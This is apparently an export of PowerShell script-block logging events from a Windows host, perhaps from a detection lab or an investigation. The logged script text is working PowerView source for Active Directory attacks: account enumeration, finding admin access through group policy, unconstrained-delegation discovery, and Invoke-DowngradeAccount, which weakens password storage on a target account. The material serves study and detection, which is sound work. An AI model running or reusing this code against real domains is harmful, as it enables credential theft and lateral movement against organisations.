[String]        $SID,        [String]        $Name,        [String]        $SamAccountName,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $Filter,        [Switch]        $ReturnRaw,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        if($SID) {            # if a SID is passed, try to resolve it to a reachable domain name for the searcher            try {                $Name = Convert-SidToName $SID                if($Name) {                    $Canonical = Convert-NT4toCanonical -ObjectName $Name                    if($Canonical) {                        $Domain = $Canonical.split(""/"")[0]                    }                    else {                        Write-Warning ""Error resolving SID '$SID'""                        return $Null                    }                }            }            catch {                Write-Warning ""Error resolving SID '$SID' : $_""                return $Null            }        }        $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($ObjectSearcher) {            if($SID) {                $ObjectSearcher.filter = ""(&(objectsid=$SID)$Filter)""            }            elseif($Name) {                $ObjectSearcher.filter = ""(&(name=$Name)$Filter)""            }            elseif($SamAccountName) {                $ObjectSearcher.filter = ""(&(samAccountName=$SamAccountName)$Filter)""            }            $ObjectSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                if($ReturnRaw) {                    $_                }                else {                    # convert/process the LDAP fields for each result                    Convert-LDAPProperty -Properties $_.Properties                }            }        }    }}function Set-ADObject {<#    .SYNOPSIS        Takes a SID, name, or SamAccountName to query for a specified        domain object, and then sets a specified 'PropertyName' to a        specified 'PropertyValue'.    .PARAMETER SID        The SID of the domain object you're querying for.    .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER PropertyName        The property name to set.    .PARAMETER PropertyValue        The value to set for PropertyName    .PARAMETER PropertyXorValue        Integer value to binary xor (-bxor) with the current int value.    .PARAMETER ClearValue        Switch. Clear the value of PropertyName    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0                Set the countrycode for matt.admin to 0    .EXAMPLE        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536                Set the password not to expire on matt.admin#>    [CmdletBinding()]    Param (        [String]        $SID,        [String]        $Name,        [String]        $SamAccountName,        [String]        $Domain,        [String]        $DomainController,        [String]        $Filter,        [Parameter(Mandatory = $True)]        [String]        $PropertyName,        $PropertyValue,        [Int]        $PropertyXorValue,        [Switch]        $ClearValue,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    $Arguments = @{        'SID' = $SID        'Name' = $Name        'SamAccountName' = $SamAccountName        'Domain' = $Domain        'DomainController' = $DomainController        'Filter' = $Filter        'PageSize' = $PageSize    }    # splat the appropriate arguments to Get-ADObject    $RawObject = Get-ADObject -ReturnRaw @Arguments        try {        # get the modifiable object for this search result        $Entry = $RawObject.GetDirectoryEntry()                if($ClearValue) {            Write-Verbose ""Clearing value""            $Entry.$PropertyName.clear()            $Entry.commitchanges()        }        elseif($PropertyXorValue) {            $TypeName = $Entry.$PropertyName[0].GetType().name            # UAC value references- https://support.microsoft.com/en-us/kb/305144            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue             $Entry.$PropertyName = $PropertyValue -as $TypeName                   $Entry.commitchanges()             }        else {            $Entry.put($PropertyName, $PropertyValue)            $Entry.setinfo()        }    }    catch {        Write-Warning ""Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_""    }}function Invoke-DowngradeAccount {<#    .SYNOPSIS        Set reversible encryption on a given account and then force the password        to be set on next user login. To repair use ""-Repair"".    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER Repair        Switch. Unset the reversible encryption flag and force password reset flag.    .EXAMPLE        PS> Invoke-DowngradeAccount -SamAccountName jason        Set reversible encryption on the 'jason' account and force the password to be changed.    .EXAMPLE        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair        Unset reversible encryption on the 'jason' account and remove the forced password change.#>    [CmdletBinding()]    Param (        [Parameter(Position=0,ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name,        [String]        $Domain,        [String]        $DomainController,        [String]        $Filter,        [Switch]        $Repair    )    process {        $Arguments = @{            'SamAccountName' = $SamAccountName            'Name' = $Name            'Domain' = $Domain            'DomainController' = $DomainController            'Filter' = $Filter        }        # splat the appropriate arguments to Get-ADObject        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue        if($Repair) {            if($UACValues.Keys -contains ""ENCRYPTED_TEXT_PWD_ALLOWED"") {                # if reversible encryption is set, unset it                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128            }            # unScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","S        This function utilizes adsisearcher to query the current AD context        for current computer objects. Based off of Carlos Perez's Audit.psm1        script in Posh-SecMod (link below).    .PARAMETER ComputerName        Return computers with a specific name, wildcards accepted.    .PARAMETER SPN        Return computers with a specific service principal name, wildcards accepted.    .PARAMETER OperatingSystem        Return computers with a specific operating system, wildcards accepted.    .PARAMETER ServicePack        Return computers with a specific service pack, wildcards accepted.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Printers        Switch. Return only printers.    .PARAMETER Ping        Switch. Ping each host to ensure it's up before enumerating.    .PARAMETER FullData        Switch. Return full computer objects instead of just system names (the default).    .PARAMETER Domain        The domain to query for computers, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Unconstrained        Switch. Return computer objects that have unconstrained delegation.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetComputer                Returns the current computers in current domain.    .EXAMPLE        PS C:\> Get-NetComputer -SPN mssql*                Returns all MS SQL servers on the domain.    .EXAMPLE        PS C:\> Get-NetComputer -Domain testing                Returns the current computers in 'testing' domain.    .EXAMPLE        PS C:\> Get-NetComputer -Domain testing -FullData                Returns full computer objects in the 'testing' domain.    .LINK        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [Alias('HostName')]        [String]        $ComputerName = '*',        [String]        $SPN,        [String]        $OperatingSystem,        [String]        $ServicePack,        [String]        $Filter,        [Switch]        $Printers,        [Switch]        $Ping,        [Switch]        $FullData,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $Unconstrained,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        # so this isn't repeated if users are passed on the pipeline        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($CompSearcher) {            # if we're checking for unconstrained delegation            if($Unconstrained) {                Write-Verbose ""Searching for computers with for unconstrained delegation""                $Filter += ""(userAccountControl:1.2.840.113556.1.4.803:=524288)""            }            # set the filters for the seracher if it exists            if($Printers) {                Write-Verbose ""Searching for printers""                # $CompSearcher.filter=""(&(objectCategory=printQueue)$Filter)""                $Filter += ""(objectCategory=printQueue)""            }            if($SPN) {                Write-Verbose ""Searching for computers with SPN: $SPN""                $Filter += ""(servicePrincipalName=$SPN)""            }            if($OperatingSystem) {                $Filter += ""(operatingsystem=$OperatingSystem)""            }            if($ServicePack) {                $Filter += ""(operatingsystemservicepack=$ServicePack)""            }            $CompSearcher.filter = ""(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)""            try {                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    $Up = $True                    if($Ping) {                        # TODO: how can these results be piped to ping for a speedup?                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname                    }                    if($Up) {                        # return full data objects                        if ($FullData) {                            # convert/process the LDAP fields for each result                            Convert-LDAPProperty -Properties $_.Properties                        }                        else {                            # otherwise we're just returning the DNS host name                            $_.properties.dnshostname                        }                    }                }            }            catch {                Write-Warning ""Error: $_""            }        }    }}function Get-ADObject {<#    .SYNOPSIS        Takes a domain SID and returns the user, group, or computer object        associated with it.    .PARAMETER SID        The SID of the domain object you're querying for.    .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER ReturnRaw        Switch. Return the raw object instead of translating its properties.        Used by Set-ADObject to modify object properties.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ADObject -SID ""S-1-5-21-2620891829-2411261497-1773853088-1110""                Get the domain object associated with the specified SID.            .EXAMPLE        PS C:\> Get-ADObject -ADSpath ""CN=AdminSDHolder,CN=System,DC=testlab,DC=local""                Get the AdminSDHolder object for the testlab.local domain.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SID,        [String]        $Name,        [String]        $SamAccountName,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $Filter,        [Switch]        $ReturnRaw,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        if($SID) {            # if a SID is passed, try to resolve it to a reachable domain name for the searcher            try {                $Name = Convert-SidToName $SID                if($Name) {                    $Canonical = Convert-NT4toCanonical -ObjectName $Name                    if($Canonical) {                        $Domain = $Canonical.split(""/"")[0]                    }                    else {                        Write-Warning ""Error resolving SID '$SID'""                        return $Null                    }                }            }            catch {                Write-Warning ""Error resolving SID '$SID' : $_""                return $Null            }        }        $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if($ObjectSearcher) {            if($SID) {                $ObjectSearcher.filter = ""(&(objectsid=$SID)$Filter)""            }            elseif($Name) {                $ObjectSearcher.filter = ""(&(name=$Name)$Filter)""            }            elseif($SamAccountName) {                $ObjectSearcher.filter = ""(&(samAccountName=$SamAccountName)$Filter)""            }            $ObjectSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                if($ReturnRaw) {                    $_                }                else {                    # convert/process the LDAP fields for each result                    Convert-LDAPProperty -Properties $_.Properties                }            }        }    }}function Set-ADObject {<#    .SYNOPSIS        Takes a SID, name, or SamAccountName to query for a specified        domain object, and then sets a specified 'PropertyName' to a        specified 'PropertyValue'.    .PARAMETER SID        The SID of the domain object you're querying for.    .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER PropertyName        The property name to set.    .PARAMETER PropertyValue        The value to set for PropertyName    .PARAMETER PropertyXorValue        Integer value to binary xor (-bxor) with the current int value.    .PARAMETER ClearValue        Switch. Clear the value of PropertyName    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName countrycode -PropertyValue 0                Set the countrycode for matt.admin to 0    .EXAMPLE        PS C:\> Set-ADObject -SamAccountName matt.admin -PropertyName useraccountcontrol -PropertyXorValue 65536                Set the password not to expire on matt.admin#>    [CmdletBinding()]    Param (        [String]        $SID,        [String]        $Name,        [String]        $SamAccountName,        [String]        $Domain,        [String]        $DomainController,        [String]        $Filter,        [Parameter(Mandatory = $True)]        [String]        $PropertyName,        $PropertyValue,        [Int]        $PropertyXorValue,        [Switch]        $ClearValue,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    $Arguments = @{        'SID' = $SID        'Name' = $Name        'SamAccountName' = $SamAccountName        'Domain' = $Domain        'DomainController' = $DomainController        'Filter' = $Filter        'PageSize' = $PageSize    }    # splat the appropriate arguments to Get-ADObject    $RawObject = Get-ADObject -ReturnRaw @Arguments        try {        # get the modifiable object for this search result        $Entry = $RawObject.GetDirectoryEntry()                if($ClearValue) {            Write-Verbose ""Clearing value""            $Entry.$PropertyName.clear()            $Entry.commitchanges()        }        elseif($PropertyXorValue) {            $TypeName = $Entry.$PropertyName[0].GetType().name            # UAC value references- https://support.microsoft.com/en-us/kb/305144            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue             $Entry.$PropertyName = $PropertyValue -as $TypeName                   $Entry.commitchanges()             }        else {            $Entry.put($PropertyName, $PropertyValue)            $Entry.setinfo()        }    }    catch {        Write-Warning ""Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_""    }}function Invoke-DowngradeAccount {<#    .SYNOPSIS        Set reversible encryption on a given account and then force the password        to be set on next user login. To repair use ""-Repair"".    .PARAMETER SamAccountName        The SamAccountName of the domain object you're querying for.     .PARAMETER Name        The Name of the domain object you're querying for.    .PARAMETER Domain        The domain to query for objects, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Filter        Additional LDAP filter string for the query.    .PARAMETER Repair        Switch. Unset the reversible encryption flag and force password reset flag.    .EXAMPLE        PS> Invoke-DowngradeAccount -SamAccountName jason        Set reversible encryption on the 'jason' account and force the password to be changed.    .EXAMPLE        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair        Unset reversible encryption on the 'jason' account and remove the forced password change.#>    [CmdletBinding()]    Param (        [Parameter(Position=0,ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name,        [String]        $Domain,        [String]        $DomainController,        [String]        $Filter,        [Switch]        $Repair    )    process {        $Arguments = @{            'SamAccountName' = $SamAccountName            'Name' = $Name            'Domain' = $Domain            'DomainController' = $DomainController            'Filter' = $Filter        }        # splat the appropriate arguments to Get-ADObject        $UACValues = Get-ADObject @Arguments | select useraccountcontrol | ConvertFrom-UACValue        if($Repair) {            if($UACValues.Keys -contains ""ENCRYPTED_TEXT_PWD_ALLOWED"") {                # if reversible encryption is set, unset it                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128            }            # un","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"CnV3ypsB8mE-0EyZyX9I","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (1 of 1):{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}ScriptBlock ID: 3ccfb5d1-29e5-4038-8305-8c8844a8fa1fPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","{($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])}","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"-nV3ypsB8mE-0EyZTH5t","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (12 of 26):  # process each member of the above local group                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {                        if($_.sid) {                            $Members += $_.sid                        }                        else {                            # just a straight local account name                            $Members += $_.name                        }                    }                }                if ($Members -or $Memberof) {                    # extract out any/all filters...I hate you GPP                    $Filters = $_.filters | ForEach-Object {                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}                        }                    }                    if($ResolveSids) {                        $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}                        $Members = $Members | ForEach-Object {Convert-SidToName $_}                    }                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}                    if($Members -isnot [system.array]) {$Members = @($Members)}                    $GPOProperties = @{                        'GPODisplayName' = $GPODisplayName                        'GPOName' = $GPOName                        'GPOPath' = $GroupsXMLPath                        'Filters' = $Filters                        'MemberOf' = $Memberof                        'Members' = $Members                    }                    New-Object -TypeName PSObject -Property $GPOProperties                }            }        }    }    end {        if($UsePSDrive -and $RandDrive) {            Write-Verbose ""Removing temp PSDrive $RandDrive""            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive        }    }}function Get-NetGPO {<#    .SYNOPSIS        Gets a list of all current GPOs in a domain.    .PARAMETER GPOname        The GPO name to query for, wildcards accepted.       .PARAMETER DisplayName        The GPO display name to query for, wildcards accepted.       .PARAMETER Domain        The domain to query for GPOs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through        e.g. ""LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGPO -Domain testlab.local                Returns the GPOs in the 'testlab.local' domain. #>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $GPOname = '*',        [String]        $DisplayName,        [String]        $Domain,        [String]        $DomainController,                [String]        $ADSpath,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($GPOSearcher) {            if($DisplayName) {                $GPOSearcher.filter=""(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))""            }            else {                $GPOSearcher.filter=""(&(objectCategory=groupPolicyContainer)(name=$GPOname))""            }            $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert/process the LDAP fields for each result                Convert-LDAPProperty -Properties $_.Properties            }        }    }}function Get-NetGPOGroup {<#    .SYNOPSIS        Returns all GPOs in a domain that set ""Restricted Groups""        or use groups.xml on on target machines.    .PARAMETER GPOname        The GPO name to query for, wildcards accepted.       .PARAMETER DisplayName        The GPO display name to query for, wildcards accepted.       .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER Domain        The domain to query for GPOs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through        e.g. ""LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .EXAMPLE        PS C:\> Get-NetGPOGroup        Get all GPOs that set local groups on the current domain.#>    [CmdletBinding()]    Param (        [String]        $GPOname = '*',        [String]        $DisplayName,        [Switch]        $ResolveSids,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # get every GPO from the specified domain with restricted groups set    Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {        $Memberof = $Null        $Members = $Null        $GPOdisplayName = $_.displayname        $GPOname = $_.name        $GPOPath = $_.gpcfilesyspath        $ParseArgs =  @{            'GptTmplPath' = ""$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            'UsePSDrive' = $UsePSDrive        }        # parse the GptTmpl.inf 'Restricted Groups' file if it exists        $Inf = Get-GptTmpl @ParseArgs        if($Inf.GroupMembership) {            $Memberof = $Inf.GroupMembership | Get-Member *Memberof | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }            $Members = $Inf.GroupMembership | Get-Member *Members | ForEach-Object { $Inf.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }            # only return an object if Members are found            if ($Members -or $Memberof) {                # if there is no Memberof defined, assume local admins                if(!$Memberof) {                    $Memberof = 'S-1-5-32-544'                }                if($ResolveSids) {                    $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}                    $Members = $Members | ForEach-Object {Convert-SidToName $_}                }                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}                if($Members -isnot [system.array]) {$Members = @($Members)}                $GPOProperties = @{                    'GPODisplayName' = $GPODisplayName                    'GPOName' = $GPOName                    'GPOPath' = $GPOPath                    'Filters' = $Null                    'MemberOf' = $Memberof                    'Members' = $Members                }                New-Object -TypeName PSObject -Property $GPOProperties            }        }        $ParseArgs =  @{            'GroupsXMLpath' = ""$GPOPath\MACHINE\Preferences\Groups\Groups.xml""            'ResolveSids' = $ResolveSids            'UsePSDrive' = $UsePSDrive        }        Get-GroupsXML @ParseArgs    }}function Find-GPOLocation {<#    .SYNOPSIS        Takes a user/group name and optional domain, and determines         the computers in the domain the user/group has local admin         (or RDP) rights to.        It does this by:            1.  resolving the user/group to its proper sid            2.  enumerating all groups the user/group is a current part of                 and extracting all target SIDs to build a target SID list            3.  pulling all GPOs that set 'Restricted Groups' by calling                Get-NetGPOGroup            4.  matching the target sid list to the queried GPO SID list                to enumerate all GPO the user is effectively applied with            5.  enumerating all OUs and sites and applicable GPO GUIs are                applied to through gplink enumerating            6.  querying for all computers under the given OUs or sites    .PARAMETER UserName        A (single) user name name to query for access.    .PARAMETER GroupName        A (single) group name name to query for access.     .PARAMETER Domain        Optional domain the user exists in for querying, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER LocalGroup        The local group to check access against.        Can be ""Administrators"" (S-1-5-32-544), ""RDP/Remote Desktop Users"" (S-1-5-32-555),        or a custom local SID. Defaults to local 'Administrators'.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName dfm                Find all computers that dfm user has local administrator rights to in         the current domain.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName dfm -Domain dev.testlab.local                Find all computers that dfm user has local administrator rights to in         the dev.testlab.local domain.    .EXAMPLE        PS C:\> Find-GPOLocation -UserName jason -LocalGroup RDP                Find all computers that jason has local RDP access rights to in the domain.#>    [CmdletBinding()]    Param (        [String]        $UserName,        [String]        $GroupName,        [String]        $Domain,        [String]        $DomainController,        [String]        $LocalGroup = 'Administrators',                [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($UserName) {        $User = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize        $UserSid = $User.objectsid        if(!$UserSid) {                Throw ""User '$UserName' not found!""        }        $TargetSid = $UserSid        $ObjectSamAccountName = $User.samaccountname        $ObjectDistName = $User.distinguishedname    }    elseif($GroupName) {        $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize        $GroupSid = $Group.objectsid        if(!$GroupSid) {                Throw ""Group '$GroupName' not found!""        }        $TargetSid = $GroupSid        $ObjectSamAccountName = $Group.samaccountname        $ObjectDistName = $Group.distinguishedname    }    else {        throw ""-UserName or -GroupName must be specified!""    }    if($LocalGroup -like ""*Admin*"") {        $LocalSID = ""S-1-5-32-544""    }    elseif ( ($LocalGroup -like ""*RDP*"") -or ($LocalGroup -like ""*Remote*"") ) {        $LocalSID = ""S-1-5-32-555""    }    elseif ($LocalGroup -like ""S-1-5*"") {        $LocalSID = $LocalGroup    }    else {        throw ""LocalGroup must be 'Administrators', 'RDP', or a 'S-1-5-X' type sid.""    }    Write-Verbose ""LocalSid: $LocalSID""    Write-Verbose ""TargetSid: $TargetSid""    Write-Verbose ""TargetObjectDistName: $ObjectDistName""    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }    # use the tokenGroups approach from Get-NetGroup to get all effective    #   security SIDs this object is a part of    $TargetSid += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }    Write-Verbose ""Effective target sids: $TargetSid""    $GPOGroupArgs =  @{        'Domain' = $Domain        'DomainController' = $DomainController        'UsePSDrive' = $UsePSDrive        'PageSize' = $PageSize    }    # get all GPO groups, and filter on ones that match our target SID list    #   and match the target local sid memberof list    $GPOgroups = Get-NetGPOGroup @GPOGroupArgs | ForEach-Object {                if ($_.members) {            $_.members = $_.members | Where-Object {$_} | ForEach-Object {                if($_ -match ""S-1-5"") {                    $_                }                else {                    # if there are any plain group names, try to resolve them to sids                    Convert-NameToSid -ObjectName $_ -Domain $Domain                }            }            # stop PowerShell 2.0's string stupid unboxing            if($_.members -isnot [system.array]) { $_.members = @($_.members) }            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }                        if($_.members) {                try {                    # only return groups that contain a target sid                    # TODO: fix stupid weird ""-DifferenceObject"" is null error                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $TargetSid -IncludeEqual -ExcludeDifferent) ) {                        if ($_.memberof -contains $LocalSid) {                            $_                        }                    }                }                 catch {                    Write-Debug ""Error comparing members and $TargetSid : $_""                }            }        }    }    Write-Verbose ""GPOgroups: $GPOgroups""    $ProcessedGUIDs = @{}    # process the matches and build the result objects    $GPOgroups | Where-ObjeScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","  # process each member of the above local group                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {                        if($_.sid) {                            $Members += $_.sid                        }                        else {                            # just a straight local account name                            $Members += $_.name                        }                    }                }                if ($Members -or $Memberof) {                    # extract out any/all filters...I hate you GPP                    $Filters = $_.filters | ForEach-Object {                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}                        }                    }                    if($ResolveSids) {                        $Memberof = $Memberof | ForEach-Object {Convert-SidToName $_}                        $Members = $Members | ForEach-Object {Convert-SidToName $_}                    }                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}                    if($Members -isnot [system.array]) {$Members = @($Members)}                    $GPOProperties = @{                        'GPODisplayName' = $GPODisplayName                        'GPOName' = $GPOName                        'GPOPath' = $GroupsXMLPath                        'Filters' = $Filters                        'MemberOf' = $Memberof                        'Members' = $Members                    }                    New-Object -TypeName PSObject -Property $GPOProperties                }            }        }    }    end {        if($UsePSDrive -and $RandDrive) {            Write-Verbose ""Removing temp PSDrive $RandDrive""            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive        }    }}function Get-NetGPO {<#    .SYNOPSIS        Gets a list of all current GPOs in a domain.    .PARAMETER GPOname        The GPO name to query for, wildcards accepted.       .PARAMETER DisplayName        The GPO display name to query for, wildcards accepted.       .PARAMETER Domain        The domain to query for GPOs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through        e.g. ""LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGPO -Domain testlab.local                Returns the GPOs in the 'testlab.local' domain. #>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $GPOname = '*',        [String]        $DisplayName,        [String]        $Domain,        [String]        $DomainController,                [String]        $ADSpath,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $GPOSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($GPOSearcher) {            if($DisplayName) {                $GPOSearcher.filter=""(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))""            }            else {                $GPOSearcher.filter=""(&(objectCategory=groupPolicyContainer)(name=$GPOname))""            }            $GPOSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert/process the LDAP fields for each result                Convert-LDAPProperty -Properties $_.Properties            }        }    }}function Get-NetGPOGroup {<#    .SYNOPSIS        Returns all GPOs in a domain that set ""Restricted Groups""        or use groups.xml on on target machines.    .PARAMETER GPOname        The GPO name to query for, wildcards accepted.       .PARAMETER DisplayName        The GPO display name to query for, wildcards accepted.       .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER Domain        The domain to query for GPOs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through        e.g. ""LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .EXAMPLE        PS C:\> Get-NetGPOGroup        Get all GPOs that set local groups on the current domain.#>    